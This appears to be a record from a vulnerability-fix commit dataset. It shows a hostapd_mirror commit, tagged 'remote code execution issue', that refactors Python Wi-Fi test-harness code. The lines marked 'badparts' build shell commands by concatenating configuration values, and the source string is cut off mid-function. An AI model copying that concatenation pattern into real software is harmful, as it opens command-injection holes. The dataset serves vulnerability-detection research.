{"https:\/\/github.com\/skulkarni-mv\/hostapd_mirror":{"2e2902c933ac952aceeb9140bce073cee4a37283":{"url":"https:\/\/api.github.com\/repos\/skulkarni-mv\/hostapd_mirror\/commits\/2e2902c933ac952aceeb9140bce073cee4a37283","html_url":"https:\/\/github.com\/skulkarni-mv\/hostapd_mirror\/commit\/2e2902c933ac952aceeb9140bce073cee4a37283","sha":"2e2902c933ac952aceeb9140bce073cee4a37283","keyword":"remote code execution issue","diff":"diff --git a\/tests\/remote\/monitor.py b\/tests\/remote\/monitor.py\nindex 5071322f7..a71501006 100644\n--- a\/tests\/remote\/monitor.py\n+++ b\/tests\/remote\/monitor.py\n@@ -7,6 +7,7 @@\n import time\n from remotehost import Host\n import config\n+import rutils\n import re\n import traceback\n import logging\n@@ -36,10 +37,7 @@ def create(devices, setup_params, refs, duts, monitors):\n \n         try:\n             host.execute([\"iw\", \"reg\", \"set\", setup_params['country']])\n-            setup_hw = setup_params['setup_hw']\n-            ifaces = re.split('; | |, ', host.ifname)\n-            for iface in ifaces:\n-                host.execute(setup_hw + \" -I \" + iface + \" -R 1\")\n+            rutils.setup_hw_host(host, setup_params, True)\n         except:\n             pass\n         mhosts.append(host)\ndiff --git a\/tests\/remote\/rutils.py b\/tests\/remote\/rutils.py\nindex fd6127bec..7836be793 100644\n--- a\/tests\/remote\/rutils.py\n+++ b\/tests\/remote\/rutils.py\n@@ -4,6 +4,7 @@\n # This software may be distributed under the terms of the BSD license.\n # See README for more details.\n \n+import re\n import time\n from remotehost import Host\n import hostapd\n@@ -26,23 +27,32 @@ def get_host(devices, dev_name):\n     return host\n \n # run setup_hw - hw specyfic\n-def setup_hw(hosts, setup_params):\n-    for host in hosts:\n-        setup_hw_host(host, setup_params)\n-\n-def setup_hw_host(host, setup_params):\n+def setup_hw_host_iface(host, iface, setup_params, force_restart=False):\n     try:\n         setup_hw = setup_params['setup_hw']\n         restart = \"\"\n         try:\n             if setup_params['restart_device'] == True:\n-                restart = \" -R \"\n+                restart = \"-R\"\n         except:\n             pass\n-        host.execute([setup_hw, \"-I\", host.ifname, restart])\n+\n+        if force_restart:\n+            restart = \"-R\"\n+\n+        host.execute([setup_hw, \"-I\", iface, restart])\n     except:\n         pass\n \n+def setup_hw_host(host, setup_params, force_restart=False):\n+    ifaces = re.split('; | |, ', host.ifname)\n+    for iface in ifaces:\n+        setup_hw_host_iface(host, iface, setup_params, force_restart)\n+\n+def setup_hw(hosts, setup_params, force_restart=False):\n+    for host in hosts:\n+        setup_hw_host(host, setup_params, force_restart)\n+\n # get traces - hw specific\n def trace_start(hosts, setup_params):\n     for host in hosts:\ndiff --git a\/tests\/remote\/test_devices.py b\/tests\/remote\/test_devices.py\nindex 97484f559..6d84d11cb 100644\n--- a\/tests\/remote\/test_devices.py\n+++ b\/tests\/remote\/test_devices.py\n@@ -35,26 +35,21 @@ def show_devices(devices, setup_params):\n         else:\n             print \"[\" + host.name + \"] - ssh communication: OK\"\n         # check setup_hw works correctly\n-        try:\n-            setup_hw = setup_params['setup_hw']\n-            try:\n-                restart_device = setup_params['restart_device']\n-            except:\n-                restart_device = \"0\"\n-            host.execute([setup_hw, \"-I\", host.ifname, \"-R\", restart_device])\n-        except:\n-            pass\n+        rutils.setup_hw_host(host, setup_params)\n+\n         # show uname\n         status, buf = host.execute([\"uname\", \"-s\", \"-n\", \"-r\", \"-m\", \"-o\"])\n         print \"\\t\" + buf\n         # show ifconfig\n-        status, buf = host.execute([\"ifconfig\", host.ifname])\n-        if status != 0:\n-            print \"\\t\" + host.ifname + \" failed\\n\"\n-            continue\n-        lines = buf.splitlines()\n-        for line in lines:\n-            print \"\\t\" + line\n+        ifaces = re.split('; | |, ', host.ifname)\n+        for iface in ifaces:\n+            status, buf = host.execute([\"ifconfig\", iface])\n+            if status != 0:\n+                print \"\\t\" + iface + \" failed\\n\"\n+                continue\n+            lines = buf.splitlines()\n+            for line in lines:\n+                print \"\\t\" + line\n         # check hostapd, wpa_supplicant, iperf exist\n         status, buf = host.execute([setup_params['wpa_supplicant'], \"-v\"])\n         if status != 0:\n@@ -88,19 +83,9 @@ def check_device(devices, setup_params, dev_name, monitor=False):\n     if status != 0:\n         raise Exception(dev_name + \" - ssh communication FAILED: \" + buf)\n \n-    ifaces = re.split('; | |, ', host.ifname)\n-    # try to setup host\/ifaces\n-    for iface in ifaces:\n-        try:\n-            setup_hw = setup_params['setup_hw']\n-            try:\n-                restart_device = setup_params['restart_device']\n-            except:\n-                restart_device = \"0\"\n-            host.execute(setup_hw + \" -I \" + iface + \" -R \" + restart_device)\n-        except:\n-            pass\n+    rutils.setup_hw_host(host, setup_params)\n \n+    ifaces = re.split('; | |, ', host.ifname)\n     # check interfaces (multi for monitor)\n     for iface in ifaces:\n         status, buf = host.execute([\"ifconfig\", iface])\n","message":"","files":{"\/tests\/remote\/monitor.py":{"changes":[{"diff":"\n \n         try:\n             host.execute([\"iw\", \"reg\", \"set\", setup_params['country']])\n-            setup_hw = setup_params['setup_hw']\n-            ifaces = re.split('; | |, ', host.ifname)\n-            for iface in ifaces:\n-                host.execute(setup_hw + \" -I \" + iface + \" -R 1\")\n+            rutils.setup_hw_host(host, setup_params, True)\n         except:\n             pass\n         mhosts.append(host)","add":1,"remove":4,"filename":"\/tests\/remote\/monitor.py","badparts":["            setup_hw = setup_params['setup_hw']","            ifaces = re.split('; | |, ', host.ifname)","            for iface in ifaces:","                host.execute(setup_hw + \" -I \" + iface + \" -R 1\")"],"goodparts":["            rutils.setup_hw_host(host, setup_params, True)"]},{"diff":"\n \n         try:\n             host.execute([\"iw\", \"reg\", \"set\", setup_params['country']])\n-            setup_hw = setup_params['setup_hw']\n-            ifaces = re.split('; | |, ', host.ifname)\n-            for iface in ifaces:\n-                host.execute(setup_hw + \" -I \" + iface + \" -R 1\")\n+            rutils.setup_hw_host(host, setup_params, True)\n         except:\n             pass\n         mhosts.append(host)","add":1,"remove":4,"filename":"\/tests\/remote\/monitor.py","badparts":["            setup_hw = setup_params['setup_hw']","            ifaces = re.split('; | |, ', host.ifname)","            for iface in ifaces:","                host.execute(setup_hw + \" -I \" + iface + \" -R 1\")"],"goodparts":["            rutils.setup_hw_host(host, setup_params, True)"]}],"source":"\n import time from remotehost import Host import config import re import traceback import logging logger=logging.getLogger() import hostapd def create(devices, setup_params, refs, duts, monitors): mons=[] mhosts=[] hosts=duts +refs for monitor in monitors: if monitor not in hosts and monitor !=\"all\": mons.append(monitor) for mon in mons: dev=config.get_device(devices, mon) if dev is None: continue host=Host(host=dev['hostname'], ifname=dev['ifname'], port=dev['port'], name=dev['name']) try: host.execute([\"iw\", \"reg\", \"set\", setup_params['country']]) setup_hw=setup_params['setup_hw'] ifaces=re.split('; | |, ', host.ifname) for iface in ifaces: host.execute(setup_hw +\" -I \" +iface +\" -R 1\") except: pass mhosts.append(host) return mhosts def destroy(devices, hosts): for host in hosts: stop(host) for monitor in host.monitors: host.execute([\"ifconfig\", monitor, \"down\"]) def setup(host, monitor_params): if host is None: return ifaces=re.split('; | |, ', host.ifname) count=0 for param in monitor_params: try: iface=ifaces[count] except: logger.debug(traceback.format_exc()) break host.execute([\"ifconfig\", iface, \" down\"]) host.execute([\"iw\", iface, \"set type monitor\"]) host.execute([\"ifconfig\", iface, \"up\"]) status, buf=host.execute([\"iw\", iface, \"set\", \"freq\", param['freq'], param['bw'], param['center_freq1'], param['center_freq2']]) if status !=0: logger.debug(\"Could not setup monitor interface: \" +buf) continue host.monitors.append(iface) count=count +1 def run(host, setup_params): monitor_res=[] log_monitor=\"\" if host is None: return None if len(host.monitors)==0: return None try: log_dir=setup_params['log_dir'] tc_name=setup_params['tc_name'] except: return None tshark=\"tshark\" for monitor in host.monitors: host.execute([\"ifconfig\", monitor, \"up\"]) tshark=tshark +\" -i \" +monitor log_monitor=log_monitor +\"_\" +monitor log=log_dir +tc_name +\"_\" +host.name +log_monitor +\".pcap\" host.add_log(log) thread=host.execute_run([tshark, \"-w\", log], monitor_res) host.thread=thread def stop(host): if host is None: return if len(host.monitors)==0: return if host.thread is None: return host.execute([\"killall\", \"-s\", \"INT\", \"tshark\"]) host.wait_execute_complete(host.thread, 5) if host.thread.isAlive(): raise Exception(\"tshark still alive\") host.thread=None def add(host, monitors): if host is None: return for monitor in monitors: if monitor !=\"all\" and monitor !=host.name: continue mon=\"mon_\" +host.ifname status, buf=host.execute([\"iw\", host.ifname, \"interface\", \"add\", mon, \"type\", \"monitor\"]) if status==0: host.monitors.append(mon) host.execute([\"ifconfig\", mon, \"up\"]) else: logger.debug(\"Could not add monitor for \" +host.name) def remove(host): stop(host) for monitor in host.monitors: host.execute([\"iw\", monitor, \"del\"]) host.monitors.remove(monitor) def get_monitor_params(wpa, is_p2p=False): if is_p2p: get_status_field_f=wpa.get_group_status_field else: get_status_field_f=wpa.get_status_field freq=get_status_field_f(\"freq\") bw=\"20\" center_freq1=\"\" center_freq2=\"\" vht_oper_chwidth=get_status_field_f(\"vht_oper_chwidth\") secondary_channel=get_status_field_f(\"secondary_channel\") vht_oper_centr_freq_seg0_idx=get_status_field_f(\"vht_oper_centr_freq_seg0_idx\") vht_oper_centr_freq_seg1_idx=get_status_field_f(\"vht_oper_centr_freq_seg1_idx\") if vht_oper_chwidth==\"0\" or vht_oper_chwidth is None: if secondary_channel==\"1\": bw=\"40\" center_freq1=str(int(freq) +10) elif secondary_channel==\"-1\": center_freq1=str(int(freq) -10) else: pass elif vht_oper_chwidth==\"1\": bw=\"80\" center_freq1=str(int(vht_oper_centr_freq_seg0_idx) * 5 +5000) elif vht_oper_chwidth==\"2\": bw=\"160\" center_freq1=str(int(vht_oper_centr_freq_seg0_idx) * 5 +5000) elif vht_oper_chwidth==\"3\": bw=\"80+80\" center_freq1=str(int(vht_oper_centr_freq_seg0_idx) * 5 +5000) center_freq2=str(int(vht_oper_centr_freq_seg1_idx) * 5 +5000) else: pass monitor_params={ \"freq\": freq, \"bw\": bw, \"center_freq1\": center_freq1, \"center_freq2\": center_freq2} return monitor_params ","sourceWithComments":"# Monitor support\n# Copyright (c) 2016, Tieto Corporation\n#\n# This software may be distributed under the terms of the BSD license.\n# See README for more details.\n\nimport time\nfrom remotehost import Host\nimport config\nimport re\nimport traceback\nimport logging\nlogger = logging.getLogger()\nimport hostapd\n\n# standalone monitor with multi iface support\ndef create(devices, setup_params, refs, duts, monitors):\n    mons = []\n    mhosts = []\n    hosts = duts + refs\n\n    # choose only standalone monitors\n    for monitor in monitors:\n        if monitor not in hosts and monitor != \"all\":\n            mons.append(monitor)\n\n    for mon in mons:\n        dev = config.get_device(devices, mon)\n        if dev is None:\n            continue\n\n        host = Host(host = dev['hostname'],\n                    ifname = dev['ifname'],\n                    port = dev['port'],\n                    name = dev['name'])\n\n        try:\n            host.execute([\"iw\", \"reg\", \"set\", setup_params['country']])\n            setup_hw = setup_params['setup_hw']\n            ifaces = re.split('; | |, ', host.ifname)\n            for iface in ifaces:\n                host.execute(setup_hw + \" -I \" + iface + \" -R 1\")\n        except:\n            pass\n        mhosts.append(host)\n\n    return mhosts\n\ndef destroy(devices, hosts):\n    for host in hosts:\n        stop(host)\n        for monitor in host.monitors:\n            host.execute([\"ifconfig\", monitor, \"down\"])\n\ndef setup(host, monitor_params):\n    if host is None:\n        return\n\n    ifaces = re.split('; | |, ', host.ifname)\n    count = 0\n    for param in monitor_params:\n        try:\n            iface = ifaces[count]\n        except:\n            logger.debug(traceback.format_exc())\n            break\n        host.execute([\"ifconfig\", iface, \" down\"])\n        host.execute([\"iw\", iface, \"set type monitor\"])\n        host.execute([\"ifconfig\", iface, \"up\"])\n        status, buf = host.execute([\"iw\", iface, \"set\", \"freq\", param['freq'],\n                                    param['bw'], param['center_freq1'],\n                                    param['center_freq2']])\n        if status != 0:\n            logger.debug(\"Could not setup monitor interface: \" + buf)\n            continue\n        host.monitors.append(iface)\n        count = count + 1\n\ndef run(host, setup_params):\n    monitor_res = []\n    log_monitor = \"\"\n    if host is None:\n        return None\n    if len(host.monitors) == 0:\n        return None\n    try:\n        log_dir = setup_params['log_dir']\n        tc_name = setup_params['tc_name']\n    except:\n        return None\n\n    tshark = \"tshark\"\n    for monitor in host.monitors:\n        host.execute([\"ifconfig\", monitor, \"up\"])\n        tshark = tshark + \" -i \" + monitor\n        log_monitor = log_monitor + \"_\" + monitor\n\n    log = log_dir + tc_name + \"_\" + host.name + log_monitor + \".pcap\"\n    host.add_log(log)\n    thread = host.execute_run([tshark, \"-w\", log], monitor_res)\n    host.thread = thread\n\n\ndef stop(host):\n    if host is None:\n        return\n    if len(host.monitors) == 0:\n        return\n    if host.thread is None:\n        return\n\n    host.execute([\"killall\", \"-s\", \"INT\", \"tshark\"])\n    host.wait_execute_complete(host.thread, 5)\n    if host.thread.isAlive():\n       raise Exception(\"tshark still alive\")\n    host.thread = None\n\n# Add monitor to existing interface\ndef add(host, monitors):\n    if host is None:\n        return\n\n    for monitor in monitors:\n        if monitor != \"all\" and monitor != host.name:\n            continue\n        mon = \"mon_\" + host.ifname\n        status, buf = host.execute([\"iw\", host.ifname, \"interface\", \"add\", mon,\n                                    \"type\", \"monitor\"])\n        if status == 0:\n            host.monitors.append(mon)\n            host.execute([\"ifconfig\", mon, \"up\"])\n        else:\n            logger.debug(\"Could not add monitor for \" + host.name)\n\ndef remove(host):\n    stop(host)\n    for monitor in host.monitors:\n        host.execute([\"iw\", monitor, \"del\"])\n        host.monitors.remove(monitor)\n\n\n# get monitor params from hostapd\/wpa_supplicant\ndef get_monitor_params(wpa, is_p2p=False):\n    if is_p2p:\n        get_status_field_f = wpa.get_group_status_field\n    else:\n        get_status_field_f = wpa.get_status_field\n    freq = get_status_field_f(\"freq\")\n    bw = \"20\"\n    center_freq1=\"\"\n    center_freq2=\"\"\n\n    vht_oper_chwidth = get_status_field_f(\"vht_oper_chwidth\")\n    secondary_channel = get_status_field_f(\"secondary_channel\")\n    vht_oper_centr_freq_seg0_idx = get_status_field_f(\"vht_oper_centr_freq_seg0_idx\")\n    vht_oper_centr_freq_seg1_idx = get_status_field_f(\"vht_oper_centr_freq_seg1_idx\")\n    if vht_oper_chwidth == \"0\" or vht_oper_chwidth is None:\n        if secondary_channel == \"1\":\n            bw = \"40\"\n            center_freq1 = str(int(freq) + 10)\n        elif secondary_channel == \"-1\":\n            center_freq1 = str(int(freq) - 10)\n        else:\n            pass\n    elif vht_oper_chwidth == \"1\":\n        bw = \"80\"\n        center_freq1 = str(int(vht_oper_centr_freq_seg0_idx) * 5 + 5000)\n    elif vht_oper_chwidth == \"2\":\n        bw = \"160\"\n        center_freq1 = str(int(vht_oper_centr_freq_seg0_idx) * 5 + 5000)\n    elif vht_oper_chwidth == \"3\":\n        bw = \"80+80\"\n        center_freq1 = str(int(vht_oper_centr_freq_seg0_idx) * 5 + 5000)\n        center_freq2 = str(int(vht_oper_centr_freq_seg1_idx) * 5 + 5000)\n    else:\n        pass\n\n    monitor_params = { \"freq\" : freq,\n                       \"bw\" : bw,\n                       \"center_freq1\" : center_freq1,\n                       \"center_freq2\" : center_freq2 }\n\n    return monitor_params\n"},"\/tests\/remote\/rutils.py":{"changes":[{"diff":"\n     return host\n \n # run setup_hw - hw specyfic\n-def setup_hw(hosts, setup_params):\n-    for host in hosts:\n-        setup_hw_host(host, setup_params)\n-\n-def setup_hw_host(host, setup_params):\n+def setup_hw_host_iface(host, iface, setup_params, force_restart=False):\n     try:\n         setup_hw = setup_params['setup_hw']\n         restart = \"\"\n         try:\n             if setup_params['restart_device'] == True:\n-                restart = \" -R \"\n+                restart = \"-R\"\n         except:\n             pass\n-        host.execute([setup_hw, \"-I\", host.ifname, restart])\n+\n+        if force_restart:\n+            restart = \"-R\"\n+\n+        host.execute([setup_hw, \"-I\", iface, restart])\n     except:\n         pass\n \n+def setup_hw_host(host, setup_params, force_restart=False):\n+    ifaces = re.split('; | |, ', host.ifname)\n+    for iface in ifaces:\n+        setup_hw_host_iface(host, iface, setup_params, force_restart)\n+\n+def setup_hw(hosts, setup_params, force_restart=False):\n+    for host in hosts:\n+        setup_hw_host(host, setup_params, force_restart)\n+\n # get traces - hw specific\n def trace_start(hosts, setup_params):\n     for host in hosts","add":16,"remove":7,"filename":"\/tests\/remote\/rutils.py","badparts":["def setup_hw(hosts, setup_params):","    for host in hosts:","        setup_hw_host(host, setup_params)","def setup_hw_host(host, setup_params):","                restart = \" -R \"","        host.execute([setup_hw, \"-I\", host.ifname, restart])"],"goodparts":["def setup_hw_host_iface(host, iface, setup_params, force_restart=False):","                restart = \"-R\"","        if force_restart:","            restart = \"-R\"","        host.execute([setup_hw, \"-I\", iface, restart])","def setup_hw_host(host, setup_params, force_restart=False):","    ifaces = re.split('; | |, ', host.ifname)","    for iface in ifaces:","        setup_hw_host_iface(host, iface, setup_params, force_restart)","def setup_hw(hosts, setup_params, force_restart=False):","    for host in hosts:","        setup_hw_host(host, setup_params, force_restart)"]},{"diff":"\n     return host\n \n # run setup_hw - hw specyfic\n-def setup_hw(hosts, setup_params):\n-    for host in hosts:\n-        setup_hw_host(host, setup_params)\n-\n-def setup_hw_host(host, setup_params):\n+def setup_hw_host_iface(host, iface, setup_params, force_restart=False):\n     try:\n         setup_hw = setup_params['setup_hw']\n         restart = \"\"\n         try:\n             if setup_params['restart_device'] == True:\n-                restart = \" -R \"\n+                restart = \"-R\"\n         except:\n             pass\n-        host.execute([setup_hw, \"-I\", host.ifname, restart])\n+\n+        if force_restart:\n+            restart = \"-R\"\n+\n+        host.execute([setup_hw, \"-I\", iface, restart])\n     except:\n         pass\n \n+def setup_hw_host(host, setup_params, force_restart=False):\n+    ifaces = re.split('; | |, ', host.ifname)\n+    for iface in ifaces:\n+        setup_hw_host_iface(host, iface, setup_params, force_restart)\n+\n+def setup_hw(hosts, setup_params, force_restart=False):\n+    for host in hosts:\n+        setup_hw_host(host, setup_params, force_restart)\n+\n # get traces - hw specific\n def trace_start(hosts, setup_params):\n     for host in hosts","add":16,"remove":7,"filename":"\/tests\/remote\/rutils.py","badparts":["def setup_hw(hosts, setup_params):","    for host in hosts:","        setup_hw_host(host, setup_params)","def setup_hw_host(host, setup_params):","                restart = \" -R \"","        host.execute([setup_hw, \"-I\", host.ifname, restart])"],"goodparts":["def setup_hw_host_iface(host, iface, setup_params, force_restart=False):","                restart = \"-R\"","        if force_restart:","            restart = \"-R\"","        host.execute([setup_hw, \"-I\", iface, restart])","def setup_hw_host(host, setup_params, force_restart=False):","    ifaces = re.split('; | |, ', host.ifname)","    for iface in ifaces:","        setup_hw_host_iface(host, iface, setup_params, force_restart)","def setup_hw(hosts, setup_params, force_restart=False):","    for host in hosts:","        setup_hw_host(host, setup_params, force_restart)"]}],"source":"\n import time from remotehost import Host import hostapd import config class TestSkip(Exception): def __init__(self, reason): self.reason=reason def __str__(self): return self.reason def get_host(devices, dev_name): dev=config.get_device(devices, dev_name) host=Host(host=dev['hostname'], ifname=dev['ifname'], port=dev['port'], name=dev['name']) host.dev=dev return host def setup_hw(hosts, setup_params): for host in hosts: setup_hw_host(host, setup_params) def setup_hw_host(host, setup_params): try: setup_hw=setup_params['setup_hw'] restart=\"\" try: if setup_params['restart_device']==True: restart=\" -R \" except: pass host.execute([setup_hw, \"-I\", host.ifname, restart]) except: pass def trace_start(hosts, setup_params): for host in hosts: trace_start_stop(host, setup_params, start=True) def trace_stop(hosts, setup_params): for host in hosts: trace_start_stop(host, setup_params, start=False) def trace_start_stop(host, setup_params, start): if setup_params['trace']==False: return try: start_trace=setup_params['trace_start'] stop_trace=setup_params['trace_stop'] if start: cmd=start_trace else: cmd=stop_trace trace_dir=setup_params['log_dir'] +host.ifname +\"\/remote_traces\" host.add_log(trace_dir +\"\/*\") host.execute([cmd, \"-I\", host.ifname, \"-D\", trace_dir]) except: pass def perf_start(hosts, setup_params): for host in hosts: perf_start_stop(host, setup_params, start=True) def perf_stop(hosts, setup_params): for host in hosts: perf_start_stop(host, setup_params, start=False) def perf_start_stop(host, setup_params, start): if setup_params['perf']==False: return try: perf_start=setup_params['perf_start'] perf_stop=setup_params['perf_stop'] if start: cmd=perf_start else: cmd=perf_stop perf_dir=setup_params['log_dir'] +host.ifname +\"\/remote_perf\" host.add_log(perf_dir +\"\/*\") host.execute([cmd, \"-I\", host.ifname, \"-D\", perf_dir]) except: pass def run_hostapd(host, setup_params): log_file=None try: tc_name=setup_params['tc_name'] log_dir=setup_params['log_dir'] log_file=log_dir +tc_name +\"_hostapd_\" +host.name +\"_\" +host.ifname +\".log\" host.execute([\"rm\", log_file]) log=\" -f \" +log_file except: log=\"\" if log_file: host.add_log(log_file) status, buf=host.execute([setup_params['hostapd'], \"-B\", \"-ddt\", \"-g\", \"udp:\" +host.port, log]) if status !=0: raise Exception(\"Could not run hostapd: \" +buf) def run_wpasupplicant(host, setup_params): log_file=None try: tc_name=setup_params['tc_name'] log_dir=setup_params['log_dir'] log_file=log_dir +tc_name +\"_wpa_supplicant_\" +host.name +\"_\" +host.ifname +\".log\" host.execute([\"rm\", log_file]) log=\" -f \" +log_file except: log=\"\" if log_file: host.add_log(log_file) status, buf=host.execute([setup_params['wpa_supplicant'], \"-B\", \"-ddt\", \"-g\", \"udp:\" +host.port, log]) if status !=0: raise Exception(\"Could not run wpa_supplicant: \" +buf) def get_ap_params(channel=\"1\", bw=\"HT20\", country=\"US\", security=\"open\", ht_capab=None, vht_capab=None): ssid=\"test_\" +channel +\"_\" +security +\"_\" +bw if bw==\"b_only\": params=hostapd.b_only_params(channel, ssid, country) elif bw==\"g_only\": params=hostapd.g_only_params(channel, ssid, country) elif bw==\"g_only_wmm\": params=hostapd.g_only_params(channel, ssid, country) params['wmm_enabled']=\"1\" elif bw==\"a_only\": params=hostapd.a_only_params(channel, ssid, country) elif bw==\"a_only_wmm\": params=hostapd.a_only_params(channel, ssid, country) params['wmm_enabled']=\"1\" elif bw==\"HT20\": params=hostapd.ht20_params(channel, ssid, country) if ht_capab: try: params['ht_capab']=params['ht_capab'] +ht_capab except: params['ht_capab']=ht_capab elif bw==\"HT40+\": params=hostapd.ht40_plus_params(channel, ssid, country) if ht_capab: params['ht_capab']=params['ht_capab'] +ht_capab elif bw==\"HT40-\": params=hostapd.ht40_minus_params(channel, ssid, country) if ht_capab: params['ht_capab']=params['ht_capab'] +ht_capab elif bw==\"VHT80\": params=hostapd.ht40_plus_params(channel, ssid, country) if ht_capab: params['ht_capab']=params['ht_capab'] +ht_capab if vht_capab: try: params['vht_capab']=params['vht_capab'] +vht_capab except: params['vht_capab']=vht_capab params['ieee80211ac']=\"1\" params['vht_oper_chwidth']=\"1\" params['vht_oper_centr_freq_seg0_idx']=str(int(channel) +6) else: params={} if security==\"tkip\": sec_params=hostapd.wpa_params(passphrase=\"testtest\") elif security==\"ccmp\": sec_params=hostapd.wpa2_params(passphrase=\"testtest\") elif security==\"mixed\": sec_params=hostapd.wpa_mixed_params(passphrase=\"testtest\") elif security==\"wep\": sec_params={ \"wep_key0\": \"123456789a\", \"wep_default_key\": \"0\", \"auth_algs\": \"1\"} elif security==\"wep_shared\": sec_params={ \"wep_key0\": \"123456789a\", \"wep_default_key\": \"0\", \"auth_algs\": \"2\"} else: sec_params={} params.update(sec_params) return params def get_ipv4(client, ifname=None): if ifname is None: ifname=client.ifname status, buf=client.execute([\"ifconfig\", ifname]) lines=buf.splitlines() for line in lines: res=line.find(\"inet addr:\") if res !=-1: break if res !=-1: words=line.split() addr=words[1].split(\":\") return addr[1] return \"unknown\" def get_ipv6(client, ifname=None): res=-1 if ifname is None: ifname=client.ifname status, buf=client.execute([\"ifconfig\", ifname]) lines=buf.splitlines() for line in lines: res=line.find(\"Scope:Link\") if res !=-1: break if res !=-1: words=line.split() if words[0]==\"inet6\" and words[1]==\"addr:\": addr_mask=words[2] addr=addr_mask.split(\"\/\") return addr[0] return \"unknown\" def get_ip(client, addr_type=\"ipv6\", iface=None): if addr_type==\"ipv6\": return get_ipv6(client, iface) elif addr_type==\"ipv4\": return get_ipv4(client, iface) else: return \"unknown addr_type: \" +addr_type def get_ipv4_addr(setup_params, number): try: ipv4_base=setup_params['ipv4_test_net'] except: ipv4_base=\"172.16.12.0\" parts=ipv4_base.split('.') ipv4=parts[0] +\".\" +parts[1] +\".\" +parts[2] +\".\" +str(number) return ipv4 def get_mac_addr(host, iface=None): if iface==None: iface=host.ifname status, buf=host.execute([\"ifconfig\", iface]) if status !=0: raise Exception(\"ifconfig \" +iface) words=buf.split() found=0 for word in words: if found==1: return word if word==\"HWaddr\": found=1 raise Exception(\"Could not find HWaddr\") def get_ping_packet_loss(ping_res): loss_line=\"\" lines=ping_res.splitlines() for line in lines: if line.find(\"packet loss\") !=-1: loss_line=line break; if loss_line==\"\": return \"100%\" sections=loss_line.split(\",\") for section in sections: if section.find(\"packet loss\") !=-1: words=section.split() return words[0] return \"100%\" def ac_to_ping_ac(qos): if qos==\"be\": qos_param=\"0x00\" elif qos==\"bk\": qos_param=\"0x20\" elif qos==\"vi\": qos_param=\"0xA0\" elif qos==\"vo\": qos_param=\"0xE0\" else: qos_param=\"0x00\" return qos_param def ping_run(host, ip, result, ifname=None, addr_type=\"ipv4\", deadline=\"5\", qos=None): if ifname is None: ifname=host.ifname if addr_type==\"ipv6\": ping=[\"ping6\"] else: ping=[\"ping\"] ping=ping +[\"-w\", deadline, \"-I\", ifname] if qos: ping=ping +[\"-Q\", ac_to_ping_ac(qos)] ping=ping +[ip] flush_arp_cache(host) thread=host.execute_run(ping, result) return thread def ping_wait(host, thread, timeout=None): host.wait_execute_complete(thread, timeout) if thread.isAlive(): raise Exception(\"ping thread still alive\") def flush_arp_cache(host): host.execute([\"ip\", \"-s\", \"-s\", \"neigh\", \"flush\", \"all\"]) def check_connectivity(a, b, addr_type=\"ipv4\", deadline=\"5\", qos=None): addr_a=get_ip(a, addr_type) addr_b=get_ip(b, addr_type) if addr_type==\"ipv4\": ping=[\"ping\"] else: ping=[\"ping6\"] ping_a_b=ping +[\"-w\", deadline, \"-I\", a.ifname] ping_b_a=ping +[\"-w\", deadline, \"-I\", b.ifname] if qos: ping_a_b=ping_a_b +[\"-Q\", ac_to_ping_ac(qos)] ping_b_a=ping_b_a +[\"-Q\", ac_to_ping_ac(qos)] ping_a_b=ping_a_b +[addr_b] ping_b_a=ping_b_a +[addr_a] flush_arp_cache(a) flush_arp_cache(b) status, buf=a.execute(ping_a_b) if status==2 and ping==\"ping6\": time.sleep(3) status, buf=a.execute(ping_a_b) if status !=0: raise Exception(\"ping \" +a.name +\"\/\" +a.ifname +\" >> \" +b.name +\"\/\" +b.ifname) a_b=get_ping_packet_loss(buf) flush_arp_cache(a) flush_arp_cache(b) status, buf=b.execute(ping_b_a) if status !=0: raise Exception(\"ping \" +b.name +\"\/\" +b.ifname +\" >> \" +a.name +\"\/\" +a.ifname) b_a=get_ping_packet_loss(buf) if int(a_b[:-1]) > 40: raise Exception(\"Too high packet lost: \" +a_b) if int(b_a[:-1]) > 40: raise Exception(\"Too high packet lost: \" +b_a) return a_b, b_a def get_iperf_speed(iperf_res, pattern=\"Mbits\/sec\"): lines=iperf_res.splitlines() sum_line=\"\" last_line=\"\" count=0 res=-1 for line in lines: res =line.find(\"[SUM]\") if res !=-1: sum_line=line if sum_line !=\"\": words=sum_line.split() for word in words: res=word.find(pattern) if res !=-1: return words[count -1] +\" \" +pattern count=count +1 for line in lines: res=line.find(pattern) if res !=-1: last_line=line if last_line==\"\": return \"0 \" +pattern count=0 words=last_line.split() for word in words: res=word.find(pattern) if res !=-1: return words[count -1] +\" \" +pattern break; count=count +1 return \"0 \" +pattern def ac_to_iperf_ac(qos): if qos==\"be\": qos_param=\"0x00\" elif qos==\"bk\": qos_param=\"0x20\" elif qos==\"vi\": qos_param=\"0xA0\" elif qos==\"vo\": qos_param=\"0xE0\" else: qos_param=\"0x00\" return qos_param def iperf_run(server, client, server_ip, client_res, server_res, l4=\"udp\", bw=\"30M\", test_time=\"30\", parallel=\"5\", qos=\"be\", param=\" -i 5 \", ifname=None, l3=\"ipv4\", port=\"5001\", iperf=\"iperf\"): if ifname==None: ifname=client.ifname if iperf==\"iperf\": iperf_server=[iperf] elif iperf==\"iperf3\": iperf_server=[iperf, \"-1\"] if l3==\"ipv4\": iperf_client=[iperf, \"-c\", server_ip, \"-p\", port] iperf_server=iperf_server +[\"-p\", port] elif l3==\"ipv6\": iperf_client=[iperf, \"-V\", \"-c\", server_ip +\"%\" +ifname, \"-p\", port] iperf_server=iperf_server +[\"-V\", \"-p\", port] else: return -1, -1 iperf_server=iperf_server +[\"-s\", \"-f\", \"m\", param] iperf_client=iperf_client +[\"-f\", \"m\", \"-t\", test_time] if parallel !=\"1\": iperf_client=iperf_client +[\"-P\", parallel] if l4==\"udp\": if iperf !=\"iperf3\": iperf_server=iperf_server +[\"-u\"] iperf_client=iperf_client +[\"-u\", \"-b\", bw] if qos: iperf_client=iperf_client +[\"-Q\", ac_to_iperf_ac(qos)] flush_arp_cache(server) flush_arp_cache(client) server_thread=server.execute_run(iperf_server, server_res) time.sleep(1) client_thread=client.execute_run(iperf_client, client_res) return server_thread, client_thread def iperf_wait(server, client, server_thread, client_thread, timeout=None, iperf=\"iperf\"): client.wait_execute_complete(client_thread, timeout) if client_thread.isAlive(): raise Exception(\"iperf client thread still alive\") server.wait_execute_complete(server_thread, 5) if server_thread.isAlive(): server.execute([\"killall\", \"-s\", \"INT\", iperf]) time.sleep(1) server.wait_execute_complete(server_thread, 5) if server_thread.isAlive(): raise Execption(\"iperf server thread still alive\") return def run_tp_test(server, client, l3=\"ipv4\", iperf=\"iperf\", l4=\"tcp\", test_time=\"10\", parallel=\"5\", qos=\"be\", bw=\"30M\", ifname=None, port=\"5001\"): 